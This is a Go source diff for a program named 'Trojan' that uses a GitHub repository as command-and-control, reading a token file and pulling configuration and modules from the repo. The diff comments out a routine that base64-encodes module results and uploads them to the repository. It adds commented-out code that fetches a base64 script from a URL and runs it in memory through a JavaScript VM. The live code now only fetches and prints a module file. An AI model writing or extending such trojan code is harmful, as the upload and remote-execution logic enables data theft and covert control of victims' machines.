@@ -2,17 +2,21 @@ package main
 
 import (
 	"context"
-	"encoding/base64"
+	// "encoding/base64"
 	"encoding/json"
 	"fmt"
+	// "io"
 	"log"
 	"math/rand"
+	// "net/http"
 	"os"
 	"sync"
 	"time"
 
 	"github.com/YarKhan02/Trojan/modules"
+	// "github.com/dop251/goja"
 	"github.com/google/go-github/v69/github"
+
 	"golang.org/x/oauth2"
 )
 
@@ -66,41 +70,91 @@ func (t *Trojan) get_config() ([]map[string]interface{}, error) {
 		}
 	}
 
+	fmt.Println("[*] Config ---------------------")
+	fmt.Println(config)
+
 	return config, nil
 }
 
+// func (t *Trojan) module_runner(module string) {
+// 	if moduleFunc, exists := moduleRegistry[module]; exists {
+// 		result := moduleFunc()
+// 		t.store_module_result(result)
+// 	} else {
+// 		fmt.Println("Module not found:", module)
+// 	}
+// }
+
 func (t *Trojan) module_runner(module string) {
-	if moduleFunc, exists := moduleRegistry[module]; exists {
-		result := moduleFunc()
-		t.store_module_result(result)
-	} else {
-		fmt.Println("Module not found:", module)
-	}
-}
-
-func (t *Trojan) store_module_result(data interface{}) {
-	timestamp := time.Now().Format(time.RFC3339)
-	remote_path := fmt.Sprintf("data/%s/%s.data", t.id, timestamp)
-	data_str := fmt.Sprintf("%v", data)
-	bindata := []byte(data_str)
-	encoded_data := base64.StdEncoding.EncodeToString(bindata)
-
-	message := "Storing module result: "
-	fileContent := &github.RepositoryContentFileOptions{
-		Message: github.Ptr(message),
-		Content: []byte(encoded_data),
-	}
-
-	user := "YarKhan02"
-	repo := "Trojan"
-
-	_, _, err := t.client.Repositories.CreateFile(t.ctx, user, repo, remote_path, fileContent)
+	script, err := get_file_contents("modules", "environment.go", t.client, t.ctx)
 	if err != nil {
-		fmt.Println("Error storing result:", err)
-	} else {
-		fmt.Println("Stored module result in:", remote_path)
+		fmt.Printf("failed to get config: %v\n", err)
 	}
+
+	fmt.Println("[*] Script ---------------------", module)
+	fmt.Println(script)
 }
+
+// func (t *Trojan) store_module_result(data interface{}) {
+// 	timestamp := time.Now().Format(time.RFC3339)
+// 	remote_path := fmt.Sprintf("data/%s/%s.data", t.id, timestamp)
+// 	data_str := fmt.Sprintf("%v", data)
+// 	bindata := []byte(data_str)
+// 	encoded_data := base64.StdEncoding.EncodeToString(bindata)
+
+// 	message := "Storing module result: "
+// 	fileContent := &github.RepositoryContentFileOptions{
+// 		Message: github.Ptr(message),
+// 		Content: []byte(encoded_data),
+// 	}
+
+// 	user := "YarKhan02"
+// 	repo := "Trojan"
+
+// 	_, _, err := t.client.Repositories.CreateFile(t.ctx, user, repo, remote_path, fileContent)
+// 	if err != nil {
+// 		fmt.Println("Error storing result:", err)
+// 	} else {
+// 		fmt.Println("Stored module result in:", remote_path)
+// 	}
+// }
+
+// Fetches and executes a remote script, then stores the result
+// func (t *Trojan) executeRemoteScript(url string) {
+// 	resp, err := http.Get(url)
+// 	if err != nil {
+// 		fmt.Println("Failed to fetch script:", err)
+// 		return
+// 	}
+// 	defer resp.Body.Close()
+
+// 	// Read script content (Base64 encoded)
+// 	body, err := io.ReadAll(resp.Body)
+// 	if err != nil {
+// 		fmt.Println("Failed to read script:", err)
+// 		return
+// 	}
+
+// 	// Decode Base64
+// 	script, err := base64.StdEncoding.DecodeString(string(body))
+// 	if err != nil {
+// 		fmt.Println("Failed to decode script:", err)
+// 		return
+// 	}
+
+// 	// Execute the script in memory using a JavaScript VM
+// 	vm := goja.New()
+// 	value, err := vm.RunString(string(script))
+// 	if err != nil {
+// 		fmt.Println("Execution error:", err)
+// 		return
+// 	}
+
+// 	// Store result in a file
+// 	t.store_module_result(value.String())
+
+// 	fmt.Println("Script executed successfully.")
+// }
 
 func github_connect() (*github.Client, context.Context, error) {
 	token, err := os.ReadFile("token.txt")
@@ -122,7 +176,6 @@ func get_file_contents(dirname string, module_name string, client *github.Client
 	repo := "Trojan"
 	filePath := dirname + "/" + module_name
 	
-
 	file_content, _, _, err := client.Repositories.GetContents(ctx, user, repo, filePath, nil)
 	if err != nil {
 		return "", fmt.Errorf("failed to fetch file: %v", err)
